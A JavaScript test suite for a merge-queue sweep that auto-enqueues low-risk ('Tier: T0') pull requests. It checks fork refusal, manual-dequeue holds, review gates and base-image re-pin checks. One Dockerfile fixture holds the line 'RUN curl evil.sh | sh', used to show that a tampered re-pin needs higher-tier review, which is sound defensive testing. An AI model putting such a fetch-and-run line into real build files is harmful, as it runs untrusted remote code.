// Copyright (c) 2026 Jeffrey Snover. All rights reserved.
// Licensed under the MIT License. See LICENSE file in the project root.

// Run: node --test operations/devops/t0-enqueue-sweep.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isTransientGatewayError, withGatewayRetry, SEARCH_PAGE_SIZE, SEARCH_MAX_PAGES, declaresT0, headPushedAt, manualDequeueHold, selectT0Candidates, planNextWake, IDLE_MINUTES, hasReviewDataError, repinTierCheck, isRepinBranch, REPIN_DOCKERFILE } from './t0-enqueue-sweep.mjs';

const NOW = Date.parse('2026-11-02T12:00:00Z');
const minsAgo = (m) => new Date(NOW - m * 60000).toISOString();
const greenAt = (start) => ['ci-gate', 'CodeQL Analysis', 'joint-gv-guard', 'consult-hold-guard']
  .map((name) => ({ name, status: 'COMPLETED', conclusion: 'SUCCESS', startedAt: start }));
const pr = (over = {}) => ({
  number: 1, body: 'Tier: T0\n\nFix a thing.', headRefOid: 'abc', baseRefName: 'main', isDraft: false,
  isInMergeQueue: false, mergeStateStatus: 'BLOCKED', author: 'jpsnover', labels: [],
  isCrossRepository: false, autoMergeRequest: null, contexts: greenAt(minsAgo(20)), ...over,
});

test('a fork PR is never enqueued, even green, idle and declaring Tier: T0 (public repo, no required review)', () => {
  const { enqueue, skip } = selectT0Candidates([pr({ number: 7, isCrossRepository: true, author: 'outsider' })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /^fork PR/);
});

test('fails closed: a PR whose fork status is unknown is treated as a fork', () => {
  const { enqueue, skip } = selectT0Candidates([pr({ number: 8, isCrossRepository: undefined })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /^fork PR/);
});

test('declaresT0 reads only the first non-empty line', () => {
  assert.equal(declaresT0('Tier: T0\nmore'), true);
  assert.equal(declaresT0('\n\n  Tier: T0'), true);
  assert.equal(declaresT0('tier: t0'), true);
  assert.equal(declaresT0('Tier: T1\nTier: T0'), false);
  assert.equal(declaresT0('Fixes stuff. Tier: T0'), false);
  assert.equal(declaresT0('Tier: T01'), false);
  assert.equal(declaresT0(null), false);
});

test('headPushedAt is the earliest check-run start, null when none', () => {
  const ctx = [{ startedAt: minsAgo(5) }, { startedAt: minsAgo(30) }, { context: 'x', state: 'SUCCESS' }];
  assert.equal(headPushedAt(ctx), NOW - 30 * 60000);
  assert.equal(headPushedAt([{ context: 'x', state: 'SUCCESS' }]), null);
});

test('a green T0 PR idle past the threshold is enqueued, and an existing arm is reported', () => {
  const { enqueue, skip } = selectT0Candidates([pr(), pr({ number: 2, autoMergeRequest: { enabledAt: 't' } })], NOW);
  assert.deepEqual(enqueue, [
    { number: 1, headRefOid: 'abc', armed: false },
    { number: 2, headRefOid: 'abc', armed: true },
  ]);
  assert.deepEqual(skip, []);
});

test(`a green T0 PR pushed less than ${IDLE_MINUTES} minutes ago waits`, () => {
  const { enqueue, skip } = selectT0Candidates([pr({ contexts: greenAt(minsAgo(IDLE_MINUTES - 1)) })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /^idle 14m < 15m/);
});

test('skips each disqualifying state with a reason', () => {
  const failingCi = greenAt(minsAgo(20)).map((c) => (c.name === 'ci-gate' ? { ...c, conclusion: 'FAILURE' } : c));
  const cases = [
    [pr({ number: 10, body: 'Tier: T1\n' }), /not declared Tier: T0/],
    [pr({ number: 11, baseRefName: 'epic/x' }), /base is epic\/x/],
    [pr({ number: 12, isDraft: true }), /draft/],
    [pr({ number: 13, isInMergeQueue: true }), /already in merge queue/],
    [pr({ number: 14, author: 'app/dependabot' }), /Dependabot/],
    [pr({ number: 15, labels: ['consult-hold'] }), /label consult-hold/],
    [pr({ number: 16, labels: ['joint-gv'] }), /label joint-gv/],
    [pr({ number: 17, labels: ['no-auto-enqueue'] }), /label no-auto-enqueue/],
    [pr({ number: 18, mergeStateStatus: 'DIRTY' }), /merge conflict/],
    [pr({ number: 19, contexts: failingCi }), /ci-gate is failed/],
    [pr({ number: 20, contexts: greenAt(minsAgo(20)).filter((c) => c.name !== 'consult-hold-guard') }), /consult-hold-guard is missing/],
    [pr({ number: 21, contexts: greenAt(undefined) }), /push time unknown/],
  ];
  const { enqueue, skip } = selectT0Candidates(cases.map(([p]) => p), NOW);
  assert.deepEqual(enqueue, []);
  for (const [p, re] of cases) assert.match(skip.find((s) => s.number === p.number).reason, re, `#${p.number}`);
});

test('only a PR blocked by nothing but the idle window is reported as waiting, with its eligible time', () => {
  const failingCi = greenAt(minsAgo(5)).map((c) => (c.name === 'ci-gate' ? { ...c, conclusion: 'FAILURE' } : c));
  const { enqueue, waiting } = selectT0Candidates([
    pr({ number: 30, contexts: greenAt(minsAgo(5)) }),                 // green, 5m idle -> waiting
    pr({ number: 31, contexts: failingCi }),                            // red -> not waiting
    pr({ number: 32, isDraft: true, contexts: greenAt(minsAgo(5)) }),  // draft -> not waiting
    pr({ number: 33 }),                                                  // green, 20m idle -> enqueue
  ], NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [33]);
  assert.deepEqual(waiting, [{ number: 30, eligibleAt: NOW - 5 * 60000 + IDLE_MINUTES * 60000 }]);
});

test('planNextWake wakes just after the earliest eligible PR, within the deadline', () => {
  const waiting = [{ number: 1, eligibleAt: NOW + 10 * 60000 }, { number: 2, eligibleAt: NOW + 4 * 60000 }];
  assert.equal(planNextWake(waiting, NOW, NOW + 16 * 60000), NOW + 4 * 60000 + 20000);
  assert.equal(planNextWake(waiting, NOW, NOW + 3 * 60000), null, 'past the deadline: stop');
  assert.equal(planNextWake([], NOW, NOW + 16 * 60000), null, 'nothing waiting: stop');
  assert.equal(planNextWake([{ number: 3, eligibleAt: NOW - 60000 }], NOW, NOW + 60000), NOW, 'already eligible: wake now');
});

// t/4879: #4561 was dequeued by hand to push a fix; the sweep re-enqueued it 29s later and
// it merged with the old head. These are the event shapes GitHub returned for #4561.
const added = (m, actor = 'jpsnover') => ({ type: 'AddedToMergeQueueEvent', createdAt: minsAgo(m), reason: null, actor });
const removed = (m, reason, actor = 'jpsnover') => ({ type: 'RemovedFromMergeQueueEvent', createdAt: minsAgo(m), reason, actor });

test('t/4879: a manual dequeue with nothing pushed since is held, with a WARN reason', () => {
  // Head pushed 20m ago, enqueued 18m ago, pulled out by hand 16m ago: green and idle, but held.
  const { enqueue, skip, waiting } = selectT0Candidates([pr({ number: 40, queueEvents: [added(18), removed(16, 'manual')] })], NOW);
  assert.deepEqual(enqueue, []);
  assert.deepEqual(waiting, []);
  assert.match(skip[0].reason, /^WARN: manually dequeued by jpsnover at .* nothing pushed since/);
  assert.deepEqual(manualDequeueHold([removed(16, 'MANUAL')], NOW - 20 * 60000), { removedAt: minsAgo(16), actor: 'jpsnover' },
    'reason is matched case-insensitively');
  assert.notEqual(manualDequeueHold([removed(16, 'manual')], null), null, 'push time unknown fails closed (held)');
});

test('t/4879: a push after the manual dequeue releases the hold', () => {
  // Dequeued 40m ago; the fix was pushed 20m ago (check runs started then).
  const { enqueue } = selectT0Candidates([pr({ number: 41, queueEvents: [added(45), removed(40, 'manual')] })], NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [41]);
});

test('t/4879: non-manual removals and a later manual re-add do not hold', () => {
  const prs = [
    pr({ number: 42, queueEvents: [added(18, 'ai-triad-dependabot-merge'), removed(16, 'merged', 'github-merge-queue')] }),
    pr({ number: 43, queueEvents: [added(18), removed(16, 'failed_checks', 'github-merge-queue')] }),
    pr({ number: 44, queueEvents: [added(18), removed(16, 'manual'), added(15)] }), // re-added by hand, then left again
    pr({ number: 45 }), // no queue history at all
  ];
  const { enqueue } = selectT0Candidates(prs, NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [42, 43, 44, 45]);
});

// t/4952(a): the sweep now also reads role-tagged review/comment bodies (never review `state` or
// `reviewDecision`) for an active changes-request, and the Design gate on user-facing diffs.
const APP = 'ai-triad-reviewer-jpsnover'; // GraphQL author.login -- no '[bot]' suffix (confirmed live)
const review = (body, commitId, submittedAt, login = APP) => ({ body, login, commitId, submittedAt });
const comment = (body, createdAt, login = APP, updatedAt = null) => ({ body, login, createdAt, updatedAt });
const RENDERER_FILE = 'taxonomy-editor/src/renderer/components/x/Thing.tsx';
const NON_UI_FILE = 'operations/devops/enqueue-pr.mjs';

test('t/4952(a): #4686 fixture -- same reviewer-App login, Design CHANGES_REQUESTED then Quality APPROVED one second later -> skipped', () => {
  const reviews = [
    review('Changes requested (Design): partial bulk-delete error path.', 'abc', '2026-11-09T14:30:00Z'),
    review('Approved (Quality): looks good otherwise.', 'abc', '2026-11-09T14:30:01Z'),
  ];
  const { enqueue, skip } = selectT0Candidates([pr({ number: 50, headRefOid: 'abc', files: [NON_UI_FILE], reviews })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /^changes requested by Design/);
});

test('t/4952(a): user-facing diff with no Design verdict at all -> skipped, awaiting Design gate', () => {
  const { enqueue, skip } = selectT0Candidates([pr({ number: 51, files: [RENDERER_FILE] })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /awaiting Design gate/);
});

test('t/4952(a): Design approved, but on an OLD head -> not counted, still awaiting Design gate', () => {
  const reviews = [review('Approved (Design): head abc, t/1.', 'OLD_SHA', '2026-11-09T10:00:00Z')];
  const { enqueue, skip } = selectT0Candidates([pr({ number: 52, headRefOid: 'abc', files: [RENDERER_FILE], reviews })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /awaiting Design gate/);
});

test('t/4952(a): Design-exempt with an empty reason is not a valid verdict -> still awaiting Design gate', () => {
  const reviews = [review('Design-exempt (Design):', 'abc', '2026-11-09T10:00:00Z')];
  const { enqueue, skip } = selectT0Candidates([pr({ number: 53, headRefOid: 'abc', files: [RENDERER_FILE], reviews })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /awaiting Design gate/);
});

test('t/4952(a): Design-exempt with a real reason, at the current head -> passes the gate', () => {
  const reviews = [review('Design-exempt (Design): store-only fix, no visible change.', 'abc', '2026-11-09T10:00:00Z')];
  const { enqueue } = selectT0Candidates([pr({ number: 54, headRefOid: 'abc', files: [RENDERER_FILE], reviews })], NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [54]);
});

test('t/4952(a): user-facing diff, Design approved AT the current head -> enqueued', () => {
  const reviews = [review('Approved (Design): head abc, t/1. Checked live.', 'abc', '2026-11-09T10:00:00Z')];
  const { enqueue } = selectT0Candidates([pr({ number: 55, headRefOid: 'abc', files: [RENDERER_FILE], reviews })], NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [55]);
});

test('t/4952(a): a non-UI T0 PR with no reviews at all is unaffected by the Design gate -> enqueued', () => {
  const { enqueue } = selectT0Candidates([pr({ number: 56, files: [NON_UI_FILE] })], NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [56]);
});

test('t/4952(a): an approval COMMENT (not a review) only counts if its effective time is after the latest push', () => {
  const pushedAt = minsAgo(20); // matches the default pr() contexts' push time
  const early = [comment('Approved (Design): head abc.', new Date(Date.parse(pushedAt) - 60000).toISOString())];
  const late = [comment('Approved (Design): head abc.', new Date(Date.parse(pushedAt) + 60000).toISOString())];
  const { skip: skipEarly } = selectT0Candidates([pr({ number: 57, files: [RENDERER_FILE], comments: early })], NOW);
  const { enqueue: enqueueLate } = selectT0Candidates([pr({ number: 58, files: [RENDERER_FILE], comments: late })], NOW);
  assert.match(skipEarly[0].reason, /awaiting Design gate/);
  assert.deepEqual(enqueueLate.map((e) => e.number), [58]);
});

test('t/4952(a): a review/comment from a different login (not the reviewer App) never satisfies or blocks the gate', () => {
  const reviews = [review('Approved (Design): head abc.', 'abc', '2026-11-09T10:00:00Z', 'some-human')];
  const { skip } = selectT0Candidates([pr({ number: 59, headRefOid: 'abc', files: [RENDERER_FILE], reviews })], NOW);
  assert.match(skip[0].reason, /awaiting Design gate/);
});

test('t/4952(a): fails closed on a fetch problem (files/reviews/comments missing, or the files list truncated)', () => {
  const { enqueue, skip } = selectT0Candidates([pr({ number: 60, reviewDataError: true })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /^WARN: could not fetch/);
});

test('t/4952(a): a changes-request check runs even for a non-user-facing PR', () => {
  const reviews = [review('Changes requested (Quality): fix the error path.', 'abc', '2026-11-09T10:00:00Z')];
  const { enqueue, skip } = selectT0Candidates([pr({ number: 61, headRefOid: 'abc', files: [NON_UI_FILE], reviews })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /^changes requested by Quality/);
});

// Quality, p/780#46: the real-world markdown/comma format parses cleanly (no WARN), and an
// unparseable "changes requested" body still blocks, but with a WARN flagging the odd shape.
test('t/4952(a): Quality\'s real markdown/comma changes-request format blocks cleanly, no WARN', () => {
  const reviews = [review('**Changes requested (Quality), at abc...**', 'abc', '2026-11-09T10:00:00Z')];
  const { enqueue, skip } = selectT0Candidates([pr({ number: 62, headRefOid: 'abc', files: [NON_UI_FILE], reviews })], NOW);
  assert.deepEqual(enqueue, []);
  assert.equal(skip[0].reason, 'changes requested by Quality');
});

test('t/4952(a): an unparseable "changes requested" body still blocks, with a WARN', () => {
  const reviews = [review('changes requested, will write up the specifics shortly', 'abc', '2026-11-09T10:00:00Z')];
  const { enqueue, skip } = selectT0Candidates([pr({ number: 63, headRefOid: 'abc', files: [NON_UI_FILE], reviews })], NOW);
  assert.deepEqual(enqueue, []);
  assert.match(skip[0].reason, /^WARN: changes requested by \(unparseable\)/);
});

// t/4952#5 (Lead should-fix): `files` pages forward, so hasNextPage means truncation; `reviews`/
// `comments` page BACKWARD from the end (last:50), so it's hasPreviousPage that means
// truncation there -- 50+ later, unrelated items could push a role's still-active
// `Changes requested` out of the kept window.
test('hasReviewDataError: null files/reviews/comments is an error', () => {
  assert.equal(hasReviewDataError({ files: null, reviews: {}, comments: {} }), true);
  assert.equal(hasReviewDataError({ files: {}, reviews: null, comments: {} }), true);
  assert.equal(hasReviewDataError({ files: {}, reviews: {}, comments: null }), true);
});

test('hasReviewDataError: files.hasNextPage=true is truncation (files page forward)', () => {
  assert.equal(hasReviewDataError({
    files: { pageInfo: { hasNextPage: true } }, reviews: { pageInfo: {} }, comments: { pageInfo: {} },
  }), true);
});

test('hasReviewDataError: reviews.hasPreviousPage=true is truncation (reviews page backward from the end)', () => {
  assert.equal(hasReviewDataError({
    files: { pageInfo: {} }, reviews: { pageInfo: { hasPreviousPage: true } }, comments: { pageInfo: {} },
  }), true);
});

test('hasReviewDataError: comments.hasPreviousPage=true is truncation (comments page backward from the end)', () => {
  assert.equal(hasReviewDataError({
    files: { pageInfo: {} }, reviews: { pageInfo: {} }, comments: { pageInfo: { hasPreviousPage: true } },
  }), true);
});

test('hasReviewDataError: reviews/comments.hasNextPage is irrelevant (wrong direction for a last:N page) -- no false positive', () => {
  assert.equal(hasReviewDataError({
    files: { pageInfo: { hasNextPage: false } },
    reviews: { pageInfo: { hasNextPage: true, hasPreviousPage: false } },
    comments: { pageInfo: { hasNextPage: true, hasPreviousPage: false } },
  }), false);
});

test('hasReviewDataError: all pages complete -> false', () => {
  assert.equal(hasReviewDataError({
    files: { pageInfo: { hasNextPage: false } },
    reviews: { pageInfo: { hasPreviousPage: false } },
    comments: { pageInfo: { hasPreviousPage: false } },
  }), false);
});

// ── t/309: a docker/base-repin-* head must still be a pure base-pin bump ──
const D1 = 'a'.repeat(64), D2 = 'b'.repeat(64);
const fromLine = (tag, d) => `FROM ghcr.io/ai-rosetta-stone/ai-triad-base:${tag}@sha256:${d} AS runtime`;
const dockerfile = (runtime, extra = []) => ['# syntax=docker/dockerfile:1', 'FROM node:22 AS build', 'RUN npm ci', runtime, ...extra, 'CMD ["node","server.js"]'].join('\n');
const BEFORE = dockerfile(fromLine('2026-11-03', D1));
const PURE_BUMP = dockerfile(fromLine('2026-11-10', D2));
const repinPr = (over = {}) => pr({ number: 50, headRefName: 'docker/base-repin-2026-11-10-bbbbbbb', files: [REPIN_DOCKERFILE], ...over });

test('repinTierCheck: a pure runtime pin bump of the only changed file is T0', () => {
  assert.equal(repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: PURE_BUMP }).tier, 'T0');
});

test('repinTierCheck: a head with an extra Dockerfile line is T1 (classifyRepinTier decides)', () => {
  const v = repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: dockerfile(fromLine('2026-11-10', D2), ['RUN curl evil.sh | sh']) });
  assert.equal(v.tier, 'T1');
  assert.match(v.reason, /line count changed/);
});

test('repinTierCheck: a pure Dockerfile bump PLUS another changed file is T1 (classifyRepinTier only sees the Dockerfile)', () => {
  const v = repinTierCheck({ files: [REPIN_DOCKERFILE, 'scripts/x.sh'], beforeText: BEFORE, afterText: PURE_BUMP });
  assert.equal(v.tier, 'T1');
  assert.match(v.reason, /want only taxonomy-editor\/Dockerfile/);
});

test('repinTierCheck: unreadable Dockerfile text is T1, never T0', () => {
  assert.equal(repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: null, afterText: PURE_BUMP }).tier, 'T1');
});

test('t/309 sweep: a re-pin PR whose head is still a pure bump enqueues', () => {
  const { enqueue, skip } = selectT0Candidates([repinPr({ repinCheck: repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: PURE_BUMP }) })], NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [50]);
  assert.equal(skip.length, 0);
});

test('t/309 sweep: a re-pin PR whose head gained an extra Dockerfile line skips with a WARN and asks for one T1 comment', () => {
  const repinCheck = repinTierCheck({ files: [REPIN_DOCKERFILE], beforeText: BEFORE, afterText: dockerfile(fromLine('2026-11-10', D2), ['RUN echo hi']) });
  const { enqueue, skip } = selectT0Candidates([repinPr({ repinCheck })], NOW);
  assert.equal(enqueue.length, 0);
  assert.match(skip[0].reason, /^WARN: docker\/base-repin-.* head is not a pure base-pin bump .*needs T1 review/);
  assert.deepEqual(skip[0].repinComment, { headRefOid: 'abc', reason: repinCheck.reason });
});

test('t/309 sweep: a re-pin PR with no re-pin facts (fetch failed) fails closed, with no comment', () => {
  const { enqueue, skip } = selectT0Candidates([repinPr()], NOW);
  assert.equal(enqueue.length, 0);
  assert.match(skip[0].reason, /could not be re-classified .*failing closed/);
  assert.equal(skip[0].repinComment, undefined);
});

test('t/309 sweep: a non-re-pin branch is unaffected (no repinCheck needed, still enqueues)', () => {
  const { enqueue } = selectT0Candidates([pr({ number: 51, headRefName: 'fix/t123-something', files: [REPIN_DOCKERFILE] })], NOW);
  assert.deepEqual(enqueue.map((e) => e.number), [51]);
});

test('isRepinBranch: matches only the drift workflow prefix', () => {
  assert.equal(isRepinBranch('docker/base-repin-2026-11-10-abc'), true);
  assert.equal(isRepinBranch('docker/t305-repin-t0'), false);
  assert.equal(isRepinBranch(undefined), false);
});

// ── t/316: the open-PR search timed out at GitHub's gateway (HTTP 502/504) as open PRs grew ──
test('isTransientGatewayError: 502/503/504 are transient; 4xx, rate limits and other errors are not', () => {
  for (const m of ['gh: HTTP 502', 'Command failed: gh api graphql ...\ngh: HTTP 504', 'HTTP 503 Service Unavailable']) assert.equal(isTransientGatewayError(m), true, m);
  for (const m of ['gh: HTTP 401', 'HTTP 403: API rate limit exceeded for installation', 'HTTP 5020', 'GraphQL: Could not resolve to a PullRequest', '', undefined]) assert.equal(isTransientGatewayError(m), false, String(m));
});

test('withGatewayRetry: a gateway error then success returns the result, with a WARN and the backoff', () => {
  const logs = []; const slept = []; let calls = 0;
  const out = withGatewayRetry(() => { calls++; if (calls < 3) throw Object.assign(new Error('Command failed'), { stderr: 'gh: HTTP 504' }); return 'ok'; },
    { delaysMs: [5, 15], sleep: (ms) => slept.push(ms), log: (m) => logs.push(m), label: 'search' });
  assert.equal(out, 'ok');
  assert.equal(calls, 3);
  assert.deepEqual(slept, [5, 15]);
  assert.match(logs[0], /^WARN: search hit a GitHub gateway error \(HTTP 504\); retrying/);
});

test('withGatewayRetry: a gateway error that outlasts the retries is rethrown (sweep still fails closed)', () => {
  let calls = 0;
  assert.throws(() => withGatewayRetry(() => { calls++; throw new Error('gh: HTTP 502'); }, { delaysMs: [1, 1], sleep: () => {}, log: () => {} }), /HTTP 502/);
  assert.equal(calls, 3);
});

test('withGatewayRetry: a non-gateway error is rethrown at once, never retried', () => {
  let calls = 0;
  assert.throws(() => withGatewayRetry(() => { calls++; throw new Error('HTTP 403: API rate limit exceeded'); }, { delaysMs: [1, 1], sleep: () => {}, log: () => {} }), /HTTP 403/);
  assert.equal(calls, 1);
});

test('search paging: smaller pages, same or larger reach than the old 50 x 10', () => {
  assert.ok(SEARCH_PAGE_SIZE <= 20, 'a page heavy enough to time out at the gateway again');
  assert.ok(SEARCH_PAGE_SIZE * SEARCH_MAX_PAGES >= 300);
});
